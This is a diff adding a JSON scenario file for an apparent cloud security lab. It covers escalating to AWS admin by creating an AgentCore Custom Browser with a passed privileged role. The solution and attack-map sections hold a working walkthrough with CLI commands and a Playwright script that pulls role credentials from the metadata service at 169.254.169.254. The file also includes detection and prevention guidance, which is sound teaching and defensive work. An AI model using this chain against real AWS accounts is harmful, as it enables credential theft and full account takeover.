@@ -1,0 +1,238 @@
+{
+  "displayName": "AgentCore Custom Browser Creation to Admin",
+  "name": "bedrock-006-iam-passrole+bedrockagentcore-createbrowser",
+  "description": "Principal with iam:PassRole and AgentCore Browser create/session permissions can create a Custom Browser with a privileged execution role and extract credentials from MMDS via CDP/Playwright by rewriting IMDSv2 token requests through a context.route hook",
+  "costEstimate": "$0/mo",
+  "pathfindingCloudId": "bedrock-006",
+  "interactiveDemo": false,
+  "category": "Privilege Escalation",
+  "subCategory": "new-passrole",
+  "pathType": "one-hop",
+  "target": "to-admin",
+  "points": 10,
+  "environments": [
+    "prod"
+  ],
+  "attackPath": {
+    "principals": [],
+    "summary": ""
+  },
+  "mitreAttack": {
+    "tactics": [
+      "TA0004 - Privilege Escalation",
+      "TA0006 - Credential Access"
+    ],
+    "techniques": [
+      "T1098.001 - Account Manipulation: Additional Cloud Credentials",
+      "T1552.005 - Unsecured Credentials: Cloud Instance Metadata API"
+    ]
+  },
+  "terraform": {
+    "variableName": "enable_single_account_privesc_one_hop_to_admin_bedrock_006_iam_passrole_bedrockagentcore_createbrowser",
+    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/bedrock-006-iam-passrole+bedrockagentcore-createbrowser"
+  },
+  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/bedrock-006-iam-passrole+bedrockagentcore-createbrowser",
+  "schemaVersion": "4.8.0",
+  "permissions": {
+    "principals": [
+      {
+        "name": "pl-prod-bedrock-006-to-admin-starting-user",
+        "required": [
+          {
+            "permission": "iam:PassRole",
+            "resource": "arn:aws:iam::*:role/pl-prod-bedrock-006-to-admin-target-role",
+            "description": "pass the privileged role to a new AgentCore Custom Browser as its execution role"
+          },
+          {
+            "permission": "bedrock-agentcore:CreateBrowser",
+            "resource": "*",
+            "description": "deploy a new Custom Browser provisioned with the attacker-chosen execution role"
+          },
+          {
+            "permission": "bedrock-agentcore:StartBrowserSession",
+            "resource": "*",
+            "description": "open a browser session and obtain a WebSocket URL for CDP connection"
+          },
+          {
+            "permission": "bedrock-agentcore:ConnectBrowserAutomationStream",
+            "resource": "*",
+            "description": "connect to the browser's Chrome DevTools Protocol endpoint to issue JavaScript commands"
+          }
+        ],
+        "helpful": [
+          {
+            "permission": "iam:ListRoles",
+            "purpose": "discover available privileged roles to pass to the new browser"
+          },
+          {
+            "permission": "iam:GetRole",
+            "purpose": "view role trust policies and confirm bedrock-agentcore.amazonaws.com is a trusted service principal"
+          },
+          {
+            "permission": "bedrock-agentcore:GetBrowser",
+            "purpose": "poll the browser status and confirm it reached READY state before starting a session"
+          }
+        ]
+      }
+    ]
+  },
+  "readme": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-bedrock-006-to-admin-starting-user` IAM user to the `pl-prod-bedrock-006-to-admin-target-role` administrative role by creating a new AgentCore Custom Browser with the privileged role as its execution role, then connecting over CDP via Playwright to issue JavaScript fetch() calls that read temporary credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254 using a context.route hook to rewrite the IMDSv2 token request as a PUT.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-bedrock-006-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-bedrock-006-to-admin-target-role`",
+    "setup": {
+      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
+      "deployNonInteractive": "```bash\nplabs enable bedrock-006-to-admin\nplabs apply\n```",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `bedrock-006-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-bedrock-006-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::{account_id}:role/pl-prod-bedrock-006-to-admin-target-role` | Target privileged role with AdministratorAccess, trusts bedrock-agentcore.amazonaws.com |\n| `arn:aws:iam::{account_id}:policy/pl-prod-bedrock-006-to-admin-starting-user-policy` | Policy granting PassRole and Bedrock AgentCore Browser permissions |\n| `arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/bedrock-006-to-admin` | CTF flag stored in SSM Parameter Store |",
+      "demoAttack": {
+        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Retrieve starting user credentials from Terraform outputs\n3. Create an AgentCore Custom Browser passing the privileged target role as the execution role\n4. Wait for the browser to reach READY state by polling GetBrowser\n5. Start a browser session to obtain the CDP WebSocket URL\n6. Connect to the browser via Playwright over CDP using the WebSocket URL\n7. Register a context.route hook to intercept requests to 169.254.169.254 and rewrite the IMDSv2 token PUT request with the required header\n8. Issue a JavaScript fetch() from inside the browser's MicroVM to retrieve a session token from MMDS\n9. Issue a second fetch() with the token header to read temporary credentials for the target role\n10. Extract AccessKeyId, SecretAccessKey, and Token from the MMDS response\n11. Verify successful privilege escalation with `sts:GetCallerIdentity`\n12. Read the CTF flag from SSM Parameter Store using the elevated credentials",
+        "resourcesCreated": "- Bedrock AgentCore Custom Browser with the privileged target role attached as the execution role\n- Local Python script at `/tmp/extract_bedrock_006_creds.py` containing the Playwright CDP extraction code",
+        "nonInteractive": "```bash\nplabs demo --list\nplabs demo bedrock-006-iam-passrole+bedrockagentcore-createbrowser\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
+      },
+      "cleanup": {
+        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup bedrock-006-iam-passrole+bedrockagentcore-createbrowser\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable bedrock-006-to-admin\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `bedrock-006-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- Principal with `iam:PassRole` on privileged roles combined with `bedrock-agentcore:CreateBrowser`, `bedrock-agentcore:StartBrowserSession`, and `bedrock-agentcore:ConnectBrowserAutomationStream` -- detectable privilege escalation path from static policy analysis\n- IAM policy granting PassRole on roles with administrative permissions without restricting the `iam:PassedToService` condition to a non-escalation service\n- Principal with unrestricted `bedrock-agentcore:*` permissions, especially when combined with PassRole\n- Roles that trust `bedrock-agentcore.amazonaws.com` with `AdministratorAccess` or other broad permissions -- any principal holding PassRole on these roles can escalate regardless of the specific AgentCore resource type (Runtime, Harness, or Browser)\n- User/role with both `CreateBrowser` and `ConnectBrowserAutomationStream` permissions -- these two together constitute the full Browser-to-credentials attack chain via CDP",
+        "prevention": "1. **Restrict PassRole Permissions**: Limit `iam:PassRole` to specific non-privileged roles using resource-based conditions and a `PassedToService` condition:\n   ```json\n   {\n     \"Effect\": \"Allow\",\n     \"Action\": \"iam:PassRole\",\n     \"Resource\": \"arn:aws:iam::*:role/bedrock-limited-*\",\n     \"Condition\": {\n       \"StringEquals\": {\n         \"iam:PassedToService\": \"bedrock-agentcore.amazonaws.com\"\n       }\n     }\n   }\n   ```\n\n2. **Implement Service Control Policies (SCPs)**: Deny `bedrock-agentcore:ConnectBrowserAutomationStream` and `bedrock-agentcore:StartBrowserSession` org-wide except for an approved allowlist of principals. CDP access to a browser's MicroVM is the critical capability that enables MMDS credential extraction:\n   ```json\n   {\n     \"Effect\": \"Deny\",\n     \"Action\": [\n       \"bedrock-agentcore:ConnectBrowserAutomationStream\",\n       \"bedrock-agentcore:StartBrowserSession\"\n     ],\n     \"Resource\": \"*\",\n     \"Condition\": {\n       \"StringNotEquals\": {\n         \"aws:PrincipalArn\": [\"arn:aws:iam::*:role/approved-browser-operator\"]\n       }\n     }\n   }\n   ```\n\n3. **Separate Create and Session Privileges**: Never grant both `bedrock-agentcore:CreateBrowser` and `bedrock-agentcore:ConnectBrowserAutomationStream` to the same principal. Browser provisioning and browser automation access should be held by distinct service accounts with separate approval workflows.\n\n4. **Role Trust Policy Restrictions**: Add `aws:SourceAccount` and `aws:SourceArn` conditions to roles trusted by `bedrock-agentcore.amazonaws.com` to prevent them from being passed to attacker-created Custom Browsers:\n   ```json\n   {\n     \"Effect\": \"Allow\",\n     \"Principal\": {\"Service\": \"bedrock-agentcore.amazonaws.com\"},\n     \"Action\": \"sts:AssumeRole\",\n     \"Condition\": {\n       \"StringEquals\": {\"aws:SourceAccount\": \"123456789012\"},\n       \"ArnLike\": {\n         \"aws:SourceArn\": \"arn:aws:bedrock-agentcore:us-east-1:123456789012:browser/approved-browser-*\"\n       }\n     }\n   }\n   ```\n\n5. **Audit Roles Trusting bedrock-agentcore.amazonaws.com**: Periodically enumerate all IAM roles with `bedrock-agentcore.amazonaws.com` in their trust policy. Any such role with `AdministratorAccess` or equivalent is a passive privilege escalation target for any principal that holds PassRole on it -- this includes browsers, runtimes, and harnesses.\n\n6. **Principle of Least Privilege for Execution Roles**: Design AgentCore execution roles with only the permissions needed for the specific workload. Execution roles should never carry `AdministratorAccess`, `iam:*`, or `sts:AssumeRole` on arbitrary roles."
+      },
+      "cloudSiem": {
+        "cloudTrailEvents": "- `bedrock-agentcore:CreateBrowser` -- new Custom Browser deployed with an execution role ARN in `requestParameters.executionRoleArn`; high severity when the passed role has administrative permissions; alert when followed within minutes by `bedrock-agentcore:StartBrowserSession` from the same principal\n- `bedrock-agentcore:StartBrowserSession` -- browser session opened and CDP WebSocket URL vended; alert on any occurrence outside of expected automation pipelines\n- `bedrock-agentcore:ConnectBrowserAutomationStream` -- CDP connection established to a browser's MicroVM; alert on any occurrence outside of expected automation; this event provides direct JavaScript execution inside the MicroVM where MMDS credentials are accessible\n- `sts:AssumeRole` -- temporary credentials assumed by `bedrock-agentcore.amazonaws.com` on behalf of a Browser execution role; look for `bedrock-agentcore.amazonaws.com` as the assumed-role principal with an unusual or admin-equivalent role ARN",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
+    },
+    "references": "- [AWS AgentCore Privilege Escalation (BeyondTrust)](https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation) -- Original research blog post documenting the AgentCore credential extraction technique including Runtime, Harness, and Browser variants\n- [AWS Bedrock AgentCore Security Credentials Management](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html) -- AWS documentation on how AgentCore manages execution role credentials inside browser MicroVMs\n- [AWS Bedrock AgentCore Browser Documentation](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/browser.html) -- AWS documentation on the Custom Browser resource type, CDP access, and session management\n- [Chrome DevTools Protocol (CDP) Documentation](https://chromedevtools.github.io/devtools-protocol/) -- Protocol reference for browser automation commands used to issue JavaScript fetch() calls from inside the MicroVM",
+    "solution": "# Solution: AgentCore Custom Browser Creation to Admin\n\nThe bedrock-006 scenario exploits a privilege escalation path that exists whenever an IAM principal holds `iam:PassRole` on a privileged role and the full set of permissions needed to create and connect to a Bedrock AgentCore Custom Browser. AgentCore Browsers are AWS-managed headless Chrome instances running inside Firecracker MicroVMs -- the same MicroVM runtime that underlies AgentCore Runtimes and Harnesses. Like those sibling resource types, AWS assumes the browser's execution role on its behalf and vends the resulting temporary credentials via the MicroVM Metadata Service (MMDS) at `169.254.169.254`.\n\nThe twist that makes browsers distinct is the absence of an `InvokeAgentRuntimeCommand` equivalent. You cannot shell directly into a browser's MicroVM with a single API call. Instead, AWS exposes a Chrome DevTools Protocol (CDP) endpoint, and the path to credentials runs through JavaScript. Playwright's `chromium.connect_over_cdp()` lets you attach to a live browser session from outside and use `page.evaluate()` to execute JavaScript that runs inside the browser's process -- which itself runs inside the MicroVM where MMDS is listening. The one wrinkle: IMDSv2 requires a PUT request to retrieve the session token, but `fetch()` in a browser context is a cross-origin request to a local IP address. Playwright's `context.route()` hook solves this by intercepting the outbound request before it leaves the browser process and rewriting it as a PUT with the required `X-aws-ec2-metadata-token-ttl-seconds` header.\n\nThis is the same PassRole attack surface as bedrock-003 (Runtime) and bedrock-005 (Harness), but the credential extraction mechanism is entirely different -- it requires browser automation tooling rather than a CLI command. In practice this lowers detection surface on the network side while raising it on the CDP connection side.\n\n## The Challenge\n\nYou start as `pl-prod-bedrock-006-to-admin-starting-user`, an IAM user with a narrow set of permissions. You have `iam:PassRole` on the target admin role and the bedrock-agentcore permissions needed to create a Custom Browser and establish a CDP session against it. You cannot list IAM users, assume roles directly, or take any other privileged action in the account.\n\nYour goal is to obtain temporary credentials for `pl-prod-bedrock-006-to-admin-target-role`, an IAM role with `AdministratorAccess`. That role trusts `bedrock-agentcore.amazonaws.com` as a service principal, which means it can be passed to an AgentCore Custom Browser as its execution role.\n\nSet up your starting credentials:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<starting_user_access_key_id>\nexport AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>\nunset AWS_SESSION_TOKEN\n\naws sts get-caller-identity\n# arn:aws:iam::{account_id}:user/pl-prod-bedrock-006-to-admin-starting-user\n```\n\nConfirm you don't have admin access yet:\n\n```bash\naws iam list-users --max-items 1\n# AccessDenied\n```\n\nGood. No admin access yet.\n\n## Reconnaissance\n\nUse the helpful `iam:ListRoles` permission to find the target role:\n\n```bash\naws iam list-roles \\\n  --query 'Roles[?contains(RoleName, `bedrock-006`)].{Name:RoleName,Arn:Arn}' \\\n  --output table\n```\n\nYou'll find `pl-prod-bedrock-006-to-admin-target-role`. Use `iam:GetRole` to inspect its trust policy:\n\n```bash\naws iam get-role \\\n  --role-name pl-prod-bedrock-006-to-admin-target-role \\\n  --query 'Role.AssumeRolePolicyDocument'\n```\n\nThe trust policy confirms `bedrock-agentcore.amazonaws.com` as a trusted service principal. This is the necessary condition: any IAM principal that holds `iam:PassRole` on this role can provision an AgentCore resource with this role as its execution role. AWS will then assume the role and expose credentials inside the resulting MicroVM.\n\nCapture the account ID and build the target role ARN:\n\n```bash\nACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)\nTARGET_ROLE_ARN=\"arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-bedrock-006-to-admin-target-role\"\nTARGET_ROLE_SHORT=\"pl-prod-bedrock-006-to-admin-target-role\"\n```\n\n## Exploitation\n\nThe attack has four steps: create the Custom Browser with the privileged execution role, wait for READY state, start a browser session to get the CDP WebSocket URL, and then use Playwright to extract MMDS credentials from inside the browser's MicroVM.\n\n### Step 1: Create the Custom Browser with the Privileged Role\n\nCreate the browser using your starting user credentials. The `executionRoleArn` is the key: you are passing the target admin role, and `iam:PassRole` is what AWS checks before accepting the call. No container image or model ID is required for a Custom Browser -- just an execution role and a browser name:\n\n```bash\nBROWSER_RESPONSE=$(aws bedrock-agentcore-control create-browser \\\n  --region us-east-1 \\\n  --name atk_browser_bedrock_006 \\\n  --execution-role-arn \"$TARGET_ROLE_ARN\" \\\n  --network-configuration '{\"networkMode\":\"PUBLIC\"}' \\\n  --output json)\n\nBROWSER_ID=$(echo \"$BROWSER_RESPONSE\" | jq -r '.browserId')\necho \"Browser ID: $BROWSER_ID\"\n```\n\nAWS provisions a Firecracker MicroVM for the browser and assumes the execution role on its behalf. The temporary credentials for that role begin flowing to MMDS once the MicroVM finishes initializing.\n\n### Step 2: Wait for READY State\n\nBrowser initialization takes 2-5 minutes. Poll `GetBrowser` until the status transitions to `READY`:\n\n```bash\nwhile true; do\n  STATUS=$(aws bedrock-agentcore-control get-browser \\\n    --region us-east-1 \\\n    --browser-id \"$BROWSER_ID\" \\\n    --query 'status' --output text)\n  echo \"Status: $STATUS\"\n  [ \"$STATUS\" = \"READY\" ] && break\n  sleep 15\ndone\n```\n\nOnce you see `READY`, the Chromium process inside the MicroVM is running and MMDS is serving credentials for the target role.\n\n### Step 3: Start a Session and Obtain the CDP WebSocket URL\n\nNow start a browser session. This returns a WebSocket URL that you'll use to connect over CDP:\n\n```bash\nSESSION_RESPONSE=$(aws bedrock-agentcore start-browser-session \\\n  --region us-east-1 \\\n  --browser-identifier \"$BROWSER_ID\" \\\n  --output json)\n\nWS_URL=$(echo \"$SESSION_RESPONSE\" | jq -r '.streams.automationStream.streamEndpoint')\necho \"WebSocket URL: $WS_URL\"\n```\n\nThe `ConnectBrowserAutomationStream` permission is validated when you establish a CDP connection through this endpoint.\n\n### Step 4: Connect via Playwright and Extract MMDS Credentials\n\nThis is where the technique diverges from the Runtime and Harness variants. Playwright's `chromium.connect_over_cdp()` attaches to the live browser session over the WebSocket URL. `page.evaluate()` then executes JavaScript in the browser process, which runs inside the MicroVM where MMDS is available.\n\nThe IMDSv2 complication: the MMDS token endpoint requires a PUT request with a `X-aws-ec2-metadata-token-ttl-seconds` header. A plain `fetch()` call in a browser context is treated as a cross-origin request and won't issue a PUT with custom headers without CORS preflight -- and the MicroVM MMDS doesn't serve CORS headers. Playwright's `context.route()` hook intercepts the outbound request before it enters the browser's network stack and rewrites it, which sidesteps this entirely.\n\nWrite the extraction script:\n\n```python\n# /tmp/extract_bedrock_006_creds.py\nimport asyncio, json, sys\nfrom playwright.async_api import async_playwright\n\nTARGET_ROLE = sys.argv[1]\nWS_URL = sys.argv[2]\n\nasync def main():\n    async with async_playwright() as p:\n        browser = await p.chromium.connect_over_cdp(WS_URL)\n        ctx = browser.contexts[0]\n\n        # Intercept MMDS token request and rewrite as PUT with required header\n        async def rewrite_mmds_token(route):\n            if '/latest/api/token' in route.request.url:\n                await route.continue_(\n                    method='PUT',\n                    headers={\n                        **dict(route.request.headers),\n                        'X-aws-ec2-metadata-token-ttl-seconds': '60'\n                    }\n                )\n            else:\n                await route.continue_()\n\n        await ctx.route('http://169.254.169.254/**', rewrite_mmds_token)\n        page = ctx.pages[0] if ctx.pages else await ctx.new_page()\n\n        # Fetch the MMDS token\n        token = await page.evaluate(\n            'fetch(\"http://169.254.169.254/latest/api/token\").then(r=>r.text())'\n        )\n\n        # Fetch credentials using the token\n        creds_json = await page.evaluate(\n            f'fetch(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/{TARGET_ROLE}\", '\n            f'{{headers:{{\"X-aws-ec2-metadata-token\":\"{token}\"}}}}).then(r=>r.json())'\n        )\n        print(json.dumps(creds_json))\n        await browser.close()\n\nasyncio.run(main())\n```\n\nRun the script to extract credentials:\n\n```bash\nCREDS=$(python3 /tmp/extract_bedrock_006_creds.py \"$TARGET_ROLE_SHORT\" \"$WS_URL\")\n```\n\nThe script returns a JSON object containing the temporary credentials for the target role:\n\n```json\n{\n  \"Code\": \"Success\",\n  \"Type\": \"AWS-HMAC\",\n  \"AccessKeyId\": \"ASIA...\",\n  \"SecretAccessKey\": \"...\",\n  \"Token\": \"...\",\n  \"Expiration\": \"...\"\n}\n```\n\nExport the credentials:\n\n```bash\nexport AWS_ACCESS_KEY_ID=$(echo \"$CREDS\" | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(echo \"$CREDS\" | jq -r '.SecretAccessKey')\nexport AWS_SESSION_TOKEN=$(echo \"$CREDS\" | jq -r '.Token')\n```\n\n## Verification\n\nConfirm you are now operating as the admin role:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:sts::{account_id}:assumed-role/pl-prod-bedrock-006-to-admin-target-role/...\n```\n\nVerify administrator access by performing an action your original user could not:\n\n```bash\naws iam list-users --max-items 3 --output table\n# Returns a table of IAM users -- you now have full admin access\n```\n\n## Capture the Flag\n\nWith admin credentials active, read the CTF flag from SSM Parameter Store. `AdministratorAccess` grants `ssm:GetParameter` on all parameters in the account, including the flag at `/pathfinding-labs/flags/bedrock-006-to-admin`. You are using the MMDS-extracted credentials here -- not your original starting user:\n\n```bash\naws ssm get-parameter \\\n  --name /pathfinding-labs/flags/bedrock-006-to-admin \\\n  --query 'Parameter.Value' \\\n  --output text\n```\n\nThe value printed is your scenario-specific flag. These are the same temporary credentials you extracted from inside the browser's MicroVM -- the `AdministratorAccess` policy attached to the target role grants unrestricted access to SSM Parameter Store, so the `ssm:GetParameter` call succeeds without any additional setup.\n\n## What Happened\n\nYou started with a low-privilege IAM user and a targeted set of Bedrock AgentCore permissions. By creating a Custom Browser and passing your chosen privileged role to it -- something `iam:PassRole` explicitly authorizes -- you caused AWS to assume the admin role on behalf of the browser's Firecracker MicroVM. The MicroVM's MMDS endpoint then served those credentials to any JavaScript executing inside the browser process.\n\nThe mechanism for extracting those credentials is what makes bedrock-006 unique among the AgentCore family. The Runtime (bedrock-003) and Harness (bedrock-005) variants both use `InvokeAgentRuntimeCommand` to run a curl one-liner inside the MicroVM. Custom Browsers have no equivalent command invocation API -- the intended interface is CDP. That makes the attack slightly more complex to execute (Playwright is required), but it also shifts the attack surface: there is no shell-level command event to watch in CloudTrail, and the JavaScript `fetch()` calls execute entirely within the browser's network context.\n\nThe `context.route()` hook is the elegant piece. By registering an intercept in the Playwright browser context before the `fetch()` call, you rewrite the GET to the IMDSv2 token endpoint into a PUT with the required header. This happens in Playwright's routing layer, before the request enters Chromium's network stack, so the browser never sees a method mismatch and MMDS receives a valid IMDSv2 token request.\n\nIn real environments this pattern appears wherever teams grant `iam:PassRole` broadly to support agentic AI workflows. The mental model \"Custom Browsers are just web scrapers -- they can't escalate privileges\" is wrong the moment an execution role with elevated permissions is attached. Any principal that holds PassRole on such a role and can connect to the browser over CDP has a path to those credentials. The bedrock-006 path adds to the growing list of AgentCore resource types -- Runtime, Harness, and now Browser -- where PassRole on a privileged role that trusts `bedrock-agentcore.amazonaws.com` is functionally equivalent to that role being compromised.\n"
+  },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-principal",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-bedrock-006-to-admin-starting-user",
+        "access": {
+          "type": "assumed-breach-credentials"
+        },
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole on the target admin role and the bedrock-agentcore permissions needed to create a Custom Browser, start a browser session, and connect via the Chrome DevTools Protocol automation stream. It cannot directly assume the target role -- but it can provision a browser that runs with the role's credentials inside a Firecracker MicroVM.\n"
+      },
+      {
+        "id": "custom-browser",
+        "label": "Custom Browser",
+        "type": "resource",
+        "subType": "bedrock-agent",
+        "arn": "arn:aws:bedrock-agentcore:{region}:{account_id}:browser/atk_browser_bedrock_006",
+        "description": "The attacker-created AgentCore Custom Browser. This browser runs inside a Firecracker MicroVM managed by AWS. When the browser is created with an IAM execution role, AWS assumes that role on behalf of the browser and vends the resulting temporary credentials to processes running inside the MicroVM via the MicroVM Metadata Service (MMDS) at 169.254.169.254.\nUnlike AgentCore Runtimes and Harnesses, there is no InvokeAgentRuntimeCommand equivalent for browsers. Instead, the attacker connects over the Chrome DevTools Protocol (CDP) using Playwright and issues JavaScript fetch() calls from inside the browser's MicroVM to read the execution role credentials from MMDS.\n"
+      },
+      {
+        "id": "target-role",
+        "label": "Target Admin Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isAdmin": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-bedrock-006-to-admin-target-role",
+        "description": "The target IAM role with AdministratorAccess. This role trusts bedrock-agentcore.amazonaws.com as a service principal, which means it can be passed to an AgentCore Custom Browser as its execution role. AWS assumes this role when the browser is created, and the resulting temporary credentials (AccessKeyId, SecretAccessKey, Token) are available at the MMDS endpoint inside the browser's Firecracker MicroVM. With these credentials, the attacker has full administrative access to the AWS account, including the ability to read the CTF flag from SSM Parameter Store.\n"
+      },
+      {
+        "id": "ctf-flag",
+        "label": "CTF Flag",
+        "type": "resource",
+        "subType": "ssm-parameter",
+        "isTarget": true,
+        "arn": "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/bedrock-006-to-admin",
+        "description": "The CTF flag for this scenario, stored as an SSM parameter. Retrieving it requires administrator-equivalent permissions in this account. Use the temporary credentials extracted from MMDS via the CDP/Playwright session to call ssm:GetParameter and read the flag value.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-principal",
+        "to": "custom-browser",
+        "label": "iam:PassRole + bedrock-agentcore:CreateBrowser",
+        "description": "Create a new AgentCore Custom Browser, passing the target admin role as the execution role. The iam:PassRole permission authorizes this -- AWS validates it before accepting the CreateBrowser API call. Once created, AWS assumes the execution role on behalf of the browser and runs a Firecracker MicroVM with the role's temporary credentials served at MMDS. The browser must reach READY state before a session can be started.\n",
+        "commands": [
+          {
+            "description": "Retrieve the account ID and build the target role ARN",
+            "command": "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && TARGET_ROLE_ARN=\"arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-bedrock-006-to-admin-target-role\""
+          },
+          {
+            "description": "Create the Custom Browser with the privileged execution role",
+            "command": "BROWSER_RESPONSE=$(aws bedrock-agentcore-control create-browser --region us-east-1 --name atk_browser_bedrock_006 --execution-role-arn \"$TARGET_ROLE_ARN\" --network-configuration '{\"networkMode\":\"PUBLIC\"}' --output json) && BROWSER_ID=$(echo \"$BROWSER_RESPONSE\" | jq -r '.browserId') && echo \"Browser ID: $BROWSER_ID\""
+          },
+          {
+            "description": "Poll GetBrowser until the browser reaches READY state",
+            "command": "while true; do STATUS=$(aws bedrock-agentcore-control get-browser --region us-east-1 --browser-id \"$BROWSER_ID\" --query 'status' --output text); echo \"Status: $STATUS\"; [ \"$STATUS\" = \"READY\" ] && break; sleep 15; done"
+          }
+        ],
+        "hints": [
+          "Create a new Custom Browser via bedrock-agentcore:CreateBrowser, specifying the target admin role as the executionRoleArn. AWS assumes that role when provisioning the browser's Firecracker MicroVM -- iam:PassRole is what authorizes you to specify a role you don't own. Poll GetBrowser until the status reaches READY before proceeding, as MicroVM initialization takes 2-5 minutes.",
+          "Once the browser is READY, start a session with bedrock-agentcore:StartBrowserSession to obtain a WebSocket URL, then use bedrock-agentcore:ConnectBrowserAutomationStream to get the CDP endpoint. Connect via Playwright's chromium.connect_over_cdp() to gain JavaScript execution inside the MicroVM. Because the MicroVM exposes IMDSv2 (which requires a PUT for the token endpoint), register a context.route() hook to intercept requests to http://169.254.169.254/latest/api/token and rewrite them as PUT requests with the X-aws-ec2-metadata-token-ttl-seconds header before the fetch() call is sent.",
+          "Browse to https://pathfinding.cloud/paths/bedrock-006 for technique details."
+        ]
+      },
+      {
+        "from": "custom-browser",
+        "to": "target-role",
+        "label": "CDP/Playwright MMDS credential extraction",
+        "description": "Connect to the Custom Browser over CDP using Playwright. Register a context.route() hook on http://169.254.169.254/** to intercept and rewrite the IMDSv2 token request (GET \u2192 PUT with X-aws-ec2-metadata-token-ttl-seconds header). Use page.evaluate() to call fetch() from inside the browser's MicroVM against the MMDS token endpoint, then use the returned token to fetch temporary credentials for the execution role from http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>. Parse AccessKeyId, SecretAccessKey, and Token from the JSON response.\n",
+        "commands": [
+          {
+            "description": "Start a browser session to obtain the CDP WebSocket URL",
+            "command": "SESSION_RESPONSE=$(aws bedrock-agentcore start-browser-session --region us-east-1 --browser-identifier \"$BROWSER_ID\" --output json) && WS_URL=$(echo \"$SESSION_RESPONSE\" | jq -r '.streams.automationStream.streamEndpoint')"
+          },
+          {
+            "description": "Write the Playwright credential extraction script",
+            "command": "cat > /tmp/extract_bedrock_006_creds.py << 'EOF'\nimport asyncio, json, sys\nfrom playwright.async_api import async_playwright\n\nTARGET_ROLE = sys.argv[1]\nWS_URL = sys.argv[2]\n\nasync def main():\n    async with async_playwright() as p:\n        browser = await p.chromium.connect_over_cdp(WS_URL)\n        ctx = browser.contexts[0]\n\n        # Intercept MMDS token request and rewrite as PUT with required header\n        async def rewrite_mmds_token(route):\n            if '/latest/api/token' in route.request.url:\n                await route.continue_(method='PUT', headers={**dict(route.request.headers), 'X-aws-ec2-metadata-token-ttl-seconds': '60'})\n            else:\n                await route.continue_()\n\n        await ctx.route('http://169.254.169.254/**', rewrite_mmds_token)\n        page = ctx.pages[0] if ctx.pages else await ctx.new_page()\n\n        # Fetch MMDS token\n        token = await page.evaluate('fetch(\"http://169.254.169.254/latest/api/token\").then(r=>r.text())')\n\n        # Fetch credentials using the token\n        creds_json = await page.evaluate(f'fetch(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/{TARGET_ROLE}\", {{headers:{{\"X-aws-ec2-metadata-token\":\"{token}\"}}}}). then(r=>r.json())')\n        print(json.dumps(creds_json))\n        await browser.close()\n\nasyncio.run(main())\nEOF"
+          },
+          {
+            "description": "Run the extraction script to retrieve MMDS credentials",
+            "command": "TARGET_ROLE_SHORT=$(basename \"$TARGET_ROLE_ARN\") && CREDS=$(python3 /tmp/extract_bedrock_006_creds.py \"$TARGET_ROLE_SHORT\" \"$WS_URL\")"
+          },
+          {
+            "description": "Export the extracted credentials",
+            "command": "export AWS_ACCESS_KEY_ID=$(echo \"$CREDS\" | jq -r '.AccessKeyId') && export AWS_SECRET_ACCESS_KEY=$(echo \"$CREDS\" | jq -r '.SecretAccessKey') && export AWS_SESSION_TOKEN=$(echo \"$CREDS\" | jq -r '.Token')"
+          },
+          {
+            "description": "Verify you are now operating as the admin role",
